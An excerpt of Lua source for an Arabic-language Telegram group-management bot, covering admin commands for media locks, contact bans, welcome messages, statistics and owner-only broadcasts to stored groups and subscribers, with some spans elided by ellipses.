MARX:del(DEVSTOR.."photo:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  local pro = tonumber(text:match("(%d+)")) local function myprofile(extra, result, success) if result.total_count_ == 0 then DEVIL_sendMsg(msg.chat_id_, msg.id_,  1, '*🔖¦* عذرا انت لا تمتلك صور في البروفايل\n', 1, 'md') else if result.total_count_ >= pro then if result.photos_[0] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_, '\n🌁¦ صورتك رقم  '..pro..' \n📋¦ عدد صورك  '..result.total_count_..' \n📊¦ حجم صورتك  '..result.photos_[0].sizes_[1].photo_.size_..' ') end else DEVIL_sendMsg(msg.chat_id_, msg.id_,  1, '\n*📛¦* انت لا تمتلك صوره رقم  *{'..pro..'}*\n*🌁¦* عدد صورك هي *{'..result.total_count_..'}*', 1, 'md')  end end end getUserProfilePhotos(msg.sender_user_id_, pro-1, 1000, myprofile)  end
if MARX:get(DEVSTOR.."link:group"..msg.chat_id_) == 'setlinkwai' and is_mod(msg) then 
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."link:group" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
else  
...
MARX:set(DEVSTOR..hash,glink)   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📬¦* تم حفظ الرابط الخاص بالمجموعه', 1, 'md')  
end   
end 
end
if MARX:get(DEVSTOR.."bc:in:gropsfwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الاذاعه بالتوجيه للمجموعات *\n✓", 1, "md") 
MARX:del(DEVSTOR.."bc:in:gropsfwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  end 
if msg.forward_info_ then 
local gps = MARX:scard(DEVSTOR..'bot:gpsby:id')   
local list = MARX:smembers(DEVSTOR..'botgps')   
...
if MARX:get(DEVSTOR.."bc:in:allfwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الاذاعه بالتوجيه للكل *\n✓", 1, "md") 
MARX:del(DEVSTOR.."bc:in:allfwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  end 
if msg.forward_info_ then 
local list = MARX:smembers(DEVSTOR..'botgps')   
for k,v in pairs(list) do  
...
local list = MARX:smembers(DEVSTOR..'usersbot')   
for k,v in pairs(list) do  
forwardMessages(v, msg.chat_id_, {[0] = msg.id_}, 1)  
end   
end 
local gpspv = MARX:scard(DEVSTOR..'usersbot')   
local gps = MARX:scard(DEVSTOR..'bot:gpsby:id')   
...
if MARX:get(DEVSTOR.."bc:in:pvfwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
DEVIL_sendMsg(msg.chat_id_,msg.id_ , 1, "*📬¦ تم الغاء الاذاعه بالتوجيه للخاص *\n✓", 1, "md") 
MARX:del(DEVSTOR.."bc:in:pvfwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  end 
if msg.forward_info_ then 
local gps = MARX:scard(DEVSTOR..'usersbot')   
local list = MARX:smembers(DEVSTOR..'usersbot')   
for k,v in pairs(list) do  
forwardMessages(v, msg.chat_id_, {[0] = msg.id_}, 1)  
end   
...
if MARX:get(DEVSTOR.."bc:in:grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الاذاعه للمجموعات *\n✓", 1, "md") 
MARX:del(DEVSTOR.."bc:in:grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
else 
local gps = MARX:scard(DEVSTOR.."bot:gpsby:id") or 0 
if msg.content_.text_ then
whatbc = 'الرساله'
local list = MARX:smembers(DEVSTOR..'bot:gpsby:id') 
for k,v in pairs(list) do 
...
if MARX:get(DEVSTOR.."bc:in:all" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then  
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الاذاعه للكل *\n✓", 1, "md") 
MARX:del(DEVSTOR.."bc:in:all" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)  
else  
local gps = MARX:scard(DEVSTOR.."bot:gpsby:id") or 0  
if msg.content_.text_ then
local list = MARX:smembers(DEVSTOR..'bot:gpsby:id') 
...
local gpsv = MARX:scard(DEVSTOR.."usersbot") or 0 
if msg.content_.text_ then
whatbc = 'الرساله'
local list = MARX:smembers(DEVSTOR..'usersbot') 
for k,v in pairs(list) do 
...
if MARX:get(DEVSTOR.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الاذاعه للمشتركين *\n✓", 1, "md") 
MARX:del(DEVSTOR.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
else 
local gps = MARX:scard(DEVSTOR.."usersbot") or 0 
if msg.content_.text_ then
whatbc = 'الرساله'
local list = MARX:smembers(DEVSTOR..'usersbot') 
for k,v in pairs(list) do 
...
if MARX:get(DEVSTOR.."rules" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."rules" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  end 
local rules = msg.content_.text_ MARX:set(DEVSTOR.."rules:group" .. msg.chat_id_, rules) DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦*تم حفظ القوانين ✔",  1, "md") end  MARX:del(DEVSTOR.."rules" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
if MARX:get(DEVSTOR.."sudo:dev" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."sudo:dev" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
MARX:del(DEVSTOR.."sudo:dev" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local dev = text:match("(.*)") MARX:set(DEVSTOR.."dev", dev)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'\n*📛¦* تم وضع كليشه المطور \n', 1, 'md')   
end
if MARX:get(DEVSTOR.."start:msgofstart" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."start:msgofstart" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
MARX:del(DEVSTOR.."start:msgofstart" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
local msgofstart = text:match("(.*)")  
MARX:set(DEVSTOR.."start:msgofstart1", msgofstart)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'*📛¦* تم وضع كليشه ستارت \n', 1, 'md')   
end

if MARX:get(DEVSTOR.."sudo:pv" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."sudo:pv" .. msg.chat_id_ .. "" .. msg.sender_user_id_) 
return false  end 
MARX:del(DEVSTOR.."sudo:pv" .. msg.chat_id_ .. "" .. msg.sender_user_id_) 
local pvstart = text:match("(.*)") 
MARX:set(DEVSTOR.."pvstart", pvstart)  
...
MARX:sadd(DEVSTOR.."usersbot",msg.chat_id_)   
local start = MARX:get(DEVSTOR.."start:msgofstart1")  
if start then 
...
if tonumber(MARX:get('numlocktextpv'..bot_id..msg.sender_user_id_) or 1) >= 100 then      
return false  end   
end  
if not is_devtaha(msg) then
if msg.forward_info_ and  MARX:get(DEVSTOR..'lock:fwd'..bot_id) then     
return false  end    
if  msg.content_.ID == 'MessagePhoto' and MARX:get(DEVSTOR..'lock:photo'..bot_id) then      
return false  end     
if msg.content_.ID == 'MessageDocument' and  MARX:get(DEVSTOR..'lock:file'..bot_id) then     
return false  end    
if msg.content_.ID == 'MessageSticker' and  MARX:get(DEVSTOR..'lock:ste'..bot_id) then     
return false  end    
if msg.content_.ID == 'MessageVoice' and  MARX:get(DEVSTOR..'lock:musec'..bot_id) then     
return false  end    
if msg.content_.ID == 'MessageContact' and  MARX:get(DEVSTOR..'lock:phon'..bot_id) then     
return false  end    
if msg.content_.ID == 'MessageVideo' and  MARX:get(DEVSTOR..'lock:ved'..bot_id) then     
return false  end    
if msg.content_.ID == 'MessageAnimation' and  MARX:get(DEVSTOR..'lock:gif'..bot_id) then     
return false  end    
if msg.content_.ID == 'MessageAudio' and  MARX:get(DEVSTOR..'lock:vico'..bot_id) then     
return false  end    
...
if MARX:get(DEVSTOR..'lock:links'..bot_id) then      
return false  end  
end
end  
if not MARX:get(DEVSTOR..'lock:botl'..bot_id) then    
if not is_devtaha(msg) then     
local pvstart = MARX:get(DEVSTOR.."pvstart")    
if pvstart then    
...
if not MARX:sismember(DEVSTOR.."usersbot",msg.chat_id_) then    
MARX:sadd(DEVSTOR.."usersbot",msg.chat_id_)    
local pvstart = MARX:get(DEVSTOR.."pvstart")    
end    
...
if not MARX:sismember(DEVSTOR..'pv:ban'..msg.chat_id_,id_user) then
if data.username_ == false then
local text = '📮¦ العضــو ↫ ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم حظره من التواصل\n✓'
MARX:incrby('numlocktextpv'..bot_id..id_user,10000000)    MARX:sadd(DEVSTOR..'pv:ban'..msg.chat_id_,id_user) 
...
if MARX:sismember(DEVSTOR..'pv:ban'..msg.chat_id_,id_user) then
if data.username_ == false then
local text = '📮¦ العضــو ↫ ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم الغاء حظره من التواصل\n✓'
MARX:del('numlocktextpv'..bot_id..id_user)    MARX:srem(DEVSTOR..'pv:ban'..msg.chat_id_,id_user)
DEVILmonshn(msg.chat_id_, id_user, msg.id_, text, 16, utf8.len(CatchName(data.first_name_,15)))  
else
zo = '*📮¦ العضــو ↫ ❪ *[@'..data.username_..'] ❫\n*📬¦ تم الغاء حظره من التواصل\n✓*'
MARX:del('numlocktextpv'..bot_id..id_user)    MARX:srem(DEVSTOR..'pv:ban'..msg.chat_id_,id_user)
...
if text == 'فتح الكل' and is_devtaha(msg) then   taha = '*🚸¦* تم فتح جميع الاوامر   ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")      MARX:del(DEVSTOR..'lock:photo'..bot_id)    MARX:del(DEVSTOR..'lock:vico'..bot_id)    MARX:del(DEVSTOR..'lock:ste'..bot_id)    MARX:del(DEVSTOR..'lock:file'..bot_id)    MARX:del(DEVSTOR..'lock:phon'..bot_id)    MARX:del(DEVSTOR..'lock:links'..bot_id)    MARX:del(DEVSTOR..'lock:ved'..bot_id)    MARX:del(DEVSTOR..'lock:fwd'..bot_id)    MARX:del(DEVSTOR..'lock:gif'..bot_id)    MARX:del(DEVSTOR..'lock:musec'..bot_id)    end      
if text == 'قفل الكل' and is_devtaha(msg) then   taha = '*📛¦* تم قفل جميع الاوامر  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")      MARX:set(DEVSTOR..'lock:photo'..bot_id,true)    MARX:set(DEVSTOR..'lock:vico'..bot_id,true)    MARX:set(DEVSTOR..'lock:ste'..bot_id,true)    MARX:set(DEVSTOR..'lock:file'..bot_id,true)    MARX:set(DEVSTOR..'lock:phon'..bot_id,true)    MARX:set(DEVSTOR..'lock:links'..bot_id,true)    MARX:set(DEVSTOR..'lock:ved'..bot_id,true)    MARX:set(DEVSTOR..'lock:fwd'..bot_id,true)    MARX:set(DEVSTOR..'lock:gif'..bot_id,true)    MARX:set(DEVSTOR..'lock:musec'..bot_id,true)     end   
if text == 'فتح الصور' and is_devtaha(msg) then  taha = '*🚸¦* تم فتح الصور   ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:del(DEVSTOR..'lock:photo'..bot_id) end  
if text == 'قفل الصور' and is_devtaha(msg) then  taha = '*📛¦* تم قفل الصور  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:set(DEVSTOR..'lock:photo'..bot_id,true) end 
if text == 'فتح الصوت' and is_devtaha(msg) then  taha = '*🚸¦* تم فتح الصوت   ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:del(DEVSTOR..'lock:vico'..bot_id) end  
if text == 'قفل الصوت' and is_devtaha(msg) then  taha = '*📛¦* تم قفل الصوت  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:set(DEVSTOR..'lock:vico'..bot_id,true) end 
if text == 'فتح الاغاني' and is_devtaha(msg) then  taha = '*🚸¦* تم فتح الاغاني   ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:del(DEVSTOR..'lock:musec'..bot_id) end  
if text == 'قفل الاغاني' and is_devtaha(msg) then  taha = '*📛¦* تم قفل الاغاني  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:set(DEVSTOR..'lock:musec'..bot_id,true) end 
if text == 'فتح المتحركه' and is_devtaha(msg) then  taha = '*🚸¦* تم فتح المتحركه   ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:del(DEVSTOR..'lock:gif'..bot_id) end  
if text == 'قفل المتحركه' and is_devtaha(msg) then  taha = '*📛¦* تم قفل المتحركه  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:set(DEVSTOR..'lock:gif'..bot_id,true) end 
if text == 'فتح التوجيه' and is_devtaha(msg) then  taha = '*🚸¦* تم فتح التوجيه   ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:del(DEVSTOR..'lock:fwd'..bot_id) end  
if text == 'قفل التوجيه' and is_devtaha(msg) then  taha = '*📛¦* تم قفل التوحيه  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:set(DEVSTOR..'lock:fwd'..bot_id,true) end 
if text == 'فتح الفيديو' and is_devtaha(msg) then  taha = '*🚸¦* تم فتح الفيديو   ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:del(DEVSTOR..'lock:ved'..bot_id) end  
if text == 'قفل الفيديو' and is_devtaha(msg) then  taha = '*📛¦* تم قفل الفيديو  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:set(DEVSTOR..'lock:ved'..bot_id,true) end 
if text == 'فتح الروابط' and is_devtaha(msg) then  taha = '*🚸¦* تم فتح الروابط   ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:del(DEVSTOR..'lock:links'..bot_id) end  
if text == 'قفل الروابط' and is_devtaha(msg) then  taha = '*📛¦* تم قفل الروابط  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:set(DEVSTOR..'lock:links'..bot_id,true) end 
if text == 'فتح الجهات' and is_devtaha(msg) then  taha = '*🚸¦* تم فتح الجهات   ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:del(DEVSTOR..'lock:phon'..bot_id) end  
if text == 'قفل الجهات' and is_devtaha(msg) then  taha = '*📛¦* تم قفل الجهات  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:set(DEVSTOR..'lock:phon'..bot_id,true) end 
if text == 'فتح الملفات' and is_devtaha(msg) then  taha = '*🚸¦* تم فتح الملفات   ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:del(DEVSTOR..'lock:file'..bot_id) end  
if text == 'قفل الملفات' and is_devtaha(msg) then  taha = '*📛¦* تم قفل الملفات  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:set(DEVSTOR..'lock:file'..bot_id,true) end 
if text == 'فتح الملصقات' and is_devtaha(msg) then  taha = '*🚸¦* تم فتح الملصقات   ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:del(DEVSTOR..'lock:ste'..bot_id) end  
if text == 'قفل الملصقات' and is_devtaha(msg) then  taha = '*📛¦* تم قفل الملصقات  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  MARX:set(DEVSTOR..'lock:ste'..bot_id,true) end 
if text == 'الاعدادات 🔏' and is_devtaha(msg) then  if MARX:get(DEVSTOR..'lock:photo'..bot_id) then    lock_photo = '* مقفل ✓ *'      else     lock_photo = '*مفتوح ✘*'    end    if MARX:get(DEVSTOR..'lock:vico'..bot_id) then    lockvic = '* مقفل ✓ *'      else     lockvic = '*مفتوح ✘*'    end    if MARX:get(DEVSTOR..'lock:ste'..bot_id) then    lockste = '* مقفل ✓ *'      else     lockste = '*مفتوح ✘*'    end    if MARX:get(DEVSTOR..'lock:file'..bot_id) then    lockfile = '* مقفل ✓ *'     else     lockfile = '*مفتوح ✘*'    end    if MARX:get(DEVSTOR..'lock:phon'..bot_id) then    lockphon = '* مقفل ✓ *'      else     lockphon = '*مفتوح ✘*'    end    if MARX:get(DEVSTOR..'lock:links'..bot_id) then    lock_link = '* مقفل ✓ *'      else     lock_link = '*مفتوح ✘*'    end    if MARX:get(DEVSTOR..'lock:ved'..bot_id) then    lock_vid = '* مقفل ✓ *'      else     lock_vid = '*مفتوح ✘*'    end    if MARX:get(DEVSTOR..'lock:fwd'..bot_id) then    lock_fwd = '* مقفل ✓ *'      else     lock_fwd = '*مفتوح ✘*'    end    if MARX:get(DEVSTOR..'lock:gif'..bot_id) then    lock_gif = '* مقفل ✓ *'      else     lock_gif = '*مفتوح ✘*'    end    if MARX:get(DEVSTOR..'lock:musec'..bot_id) then    lock_muse = '* مقفل ✓ *'      else     lock_muse = '*مفتوح ✘*'    end    local text = '*📛¦* اهلا بك في اعدادات الخاص 🍃'..'\n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n'..    '\n*📬¦* الروابط '..lock_link..    '\n'..'*📬¦* الصور '..lock_photo..    '\n'..'*📬¦* الاغاني '..lockvic..    '\n'..'*📬¦* الملصقات '..lockste..    '\n'..'*📬¦* الملفات '..lockfile..    '\n'..'*📬¦* الجهات '..lockphon..    '\n'..'*📬¦* الفيديو '..lock_vid..    '\n'..'*📬¦* التوجيه '..lock_fwd..    '\n'..'*📬¦* المتحركه '..lock_gif..    '\n'..'*📬¦* الصوت '..lock_muse..    '\n\nـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n🚨*¦* اضافه الى ذالك تستطيع قفل وفتح الكل\n🚸*¦* قفل الكل \n🚸*¦* فتح الكل'    DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')     end     
...
if text == 'مسح المحظورين 📢' and is_devtaha(msg) then       local list = MARX:smembers(DEVSTOR..'pv:ban'..msg.chat_id_)   for k,v in pairs(list) do     MARX:del(DEVSTOR..'pv:ban'..msg.chat_id_)   MARX:del('numlocktextpv'..bot_id..v)  end   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'📛*¦* تم مسح المحظورين', 1, 'md')     end
if text == 'تفعيل البوت الخدمي 🎮' and is_devtaha(msg) then local  taha = '*📛¦*تم تفعيل البوت خدمي  ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") MARX:del(DEVSTOR..'lock:bot:free'..bot_id) end 
if text == 'تعطيل البوت الخدمي 🚸' and is_devtaha(msg) then taha = '*📛¦*تم تعطيل البوت الخدمي  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") MARX:set(DEVSTOR..'lock:bot:free'..bot_id,true) end
if text == 'تفعيل تواصل 📨' and is_devtaha(msg) then local  taha = '*📛¦*تم تفعيل بوت التواصل  ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") MARX:del(DEVSTOR..'lock:botl'..bot_id) end 
if text == 'تعطيل تواصل 📩' and is_devtaha(msg) then taha = '*📛¦*تم تعطيل التواصل  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") MARX:set(DEVSTOR..'lock:botl'..bot_id,true) end
...
if text == "وضع اسم البوت ⚡" and is_devtaha(msg) then MARX:setex(DEVSTOR..'namebot:witting'..msg.sender_user_id_,300,true) DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* ارسل لي الاسم 📯\n",1, 'md')  end
if text == 'مسح المميزين عام 🌟' and is_devtaha(msg) then      local list = MARX:smembers(DEVSTOR..'vip:groups')    if #list == 0 then  DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'*📮¦* لا يوجد مميزين عام ليتم مسحهم\n', 1, 'md')   return false  end  local num = 0  for k,v in pairs(list) do    MARX:srem(DEVSTOR.."vip:groups",v)    num = num + 1  end   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'*📬¦ تم مسح {'..num..'} من المميزين عام *\n', 1, 'md')   end
if text == 'مسح المطورين 👮' and is_devtaha(msg) then     local list = MARX:smembers(DEVSTOR..'sudo:bot')    if #list == 0 then  DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'*📮¦* لا يوجد مطورين ليتم مسحهم\n', 1, 'md')   return false  end  local num = 0  for k,v in pairs(list) do    MARX:srem(DEVSTOR.."sudo:bot",v)    num = num + 1  end   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'*📬¦ تم مسح {'..num..'} من المطورين *\n', 1, 'md')   end
if text == 'مسح قائمه العام 🚷' and is_devtaha(msg) then   local list = MARX:smembers(DEVSTOR..'DEVIL:gbaned')    if #list == 0 then  DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'*📮¦* لا يوجد محظورين عام ليتم مسحهم\n', 1, 'md')   return false  end  local num = 0  for k,v in pairs(list) do    MARX:srem(DEVSTOR.."DEVIL:gbaned",v)    num = num + 1  end   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'*📬¦ تم مسح {'..num..'} من المحظورين عام *\n', 1, 'md')   end
if text and text:match("^ضع رد تواصل 💻$") and is_devtaha(msg) then   MARX:setex(DEVSTOR.."sudo:pv" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'📬*¦* ارسل لي النص الذي تريده ', 1, 'md') end 
if text and text:match("^ضع كليشه المطور 🎐$") and is_devtaha(msg) then MARX:setex(DEVSTOR.."sudo:dev" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'📬*¦* ارسل لي النص الذي تريده ', 1, 'md') end 
if text and text:match("^ضع كليشه ستارت 📠$") and is_devtaha(msg) then MARX:setex(DEVSTOR.."start:msgofstart" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'📬*¦* ارسل لي النص الذي تريده ', 1, 'md') end 
if text == 'تفعيل رساله الترحيب 🎌' and is_devtaha(msg) then local  taha = '*📛¦*تم تفعيل رسالة ترحيب عند الاضافه  ✔' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") MARX:del(DEVSTOR..'lock:klsh:add'..bot_id) end 
if text == 'تعطيل رساله الترحيب 📱' and is_devtaha(msg) then taha = '*📛¦*تم تعطيل رسالة ترحيب عند الاضافه  ❌' DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") MARX:set(DEVSTOR..'lock:klsh:add'..bot_id,true) end
if text == "حذف رد التواصل 🔧" and is_devtaha(msg) then  MARX:del(DEVSTOR.."pvstart") DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, '*📛¦*تم حذف رد التوصل', 1, "md") end 
if text == "حذف كليشه ستارت 🃏" and is_devtaha(msg) then  MARX:del(DEVSTOR.."start:msgofstart1") DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, '*📛¦*تم حذف كليشه ستارت', 1, "md") end 
if text == "حذف كليشه المطور 🀄" and is_devtaha(msg) then  MARX:del(DEVSTOR.."dev") DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, '*📛¦*تم حذف كليشه المطور', 1, "md") end 
if text and text:match("^ضع عدد الاعضاء 📜$") and is_devtaha(msg) then  MARX:setex(DEVSTOR.."numadd:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  local t = '*📊¦ ارسل لي العدد الان*'  DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end
if text == "جلب رد التواصل 📚" and is_devtaha(msg) then if MARX:get(DEVSTOR.."pvstart") then pvstart = MARX:get(DEVSTOR.."pvstart") DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,''..check_markdown(pvstart)..'', 1, 'md')  else  DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'*✉¦ لا يوجد رد في التواصل \n📮¦* ارسل `ضع رد التواصل`\n🍃', 1, 'md')  end  end
if text == "جلب كليشه ستارت 📚" and is_devtaha(msg) then  local start = MARX:get(DEVSTOR.."start:msgofstart1")  if start then DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,''..check_markdown(start)..'', 1, 'md') else DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'*🎭¦ لم يتم وضع كليشه ستارت *\n', 1, 'md') end end
if text == 'الاحصائيات 🔭' and is_devtaha(msg) then    local grall = MARX:scard(DEVSTOR.."botgps") or 0    local gradd = MARX:scard(DEVSTOR..'bot:gpsby:id') or 0    local uspv = MARX:scard(DEVSTOR.."usersbot") or 0    DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'\n*📮¦ عدد المجموعات الكلي ↫ ❪'..grall..'❫\n📬¦ عدد المجموعات المفعله ↫ ❪'..gradd..'❫\n📛¦ عدد المجموعات غير مفعله ↫ ❪'..(grall - gradd)..'❫\n💥¦ عدد المشتركين ↫ ❪'..uspv..'❫*\n✓', 1, 'md')   end
if text=="اذاعه بالتوجيه 📬" and msg.reply_to_message_id_ == 0  and is_devtaha(msg) then   MARX:setex(DEVSTOR.."bc:in:gropsfwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true)   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📮¦* ارسل لي التوجيه ليتم اذاعته للمجموعات\n✓", 1, "md")   end
if text=="اذاعه خاص بالتوجيه 🔮" and msg.reply_to_message_id_ == 0  and is_devtaha(msg) then   MARX:setex(DEVSTOR.."bc:in:pvfwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true)   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📮¦* ارسل لي التوجيه ليتم اذاعته للخاص\n✓", 1, "md")   end
if text=="اذاعه عام بالتوجيه 💾" and msg.reply_to_message_id_ == 0  and is_devtaha(msg) then   MARX:setex(DEVSTOR.."bc:in:allfwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true)   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📮¦* ارسل لي التوجيه ليتم اذاعته للكل\n✓", 1, "md")   end
if text=="اذاعه 📡" and msg.reply_to_message_id_ == 0  and is_devtaha(msg) then   MARX:setex(DEVSTOR.."bc:in:grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true)   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📮¦* ارسل لي سواء كان » ❪ رساله , صوره , متحركه , ملصق  ❫ للاذاعه الى المجموعات\n✓", 1, "md")   end
if text=="اذاعه للكل 📡" and msg.reply_to_message_id_ == 0  and is_devtaha(msg) then   MARX:setex(DEVSTOR.."bc:in:all" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true)   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📮¦* ارسل لي سواء كان » ❪ رساله , صوره , متحركه , ملصق  ❫ للاذاعه الى الكل\n✓", 1, "md")   end
if text=="اذاعه خاص 📡" and msg.reply_to_message_id_ == 0 and is_devtaha(msg) then   MARX:setex(DEVSTOR.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true)   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📮¦* ارسل لي سواء كان » ❪ رساله , صوره , متحركه , ملصق  ❫ للاذاعه الى الخاص\n✓", 1, "md")   end 
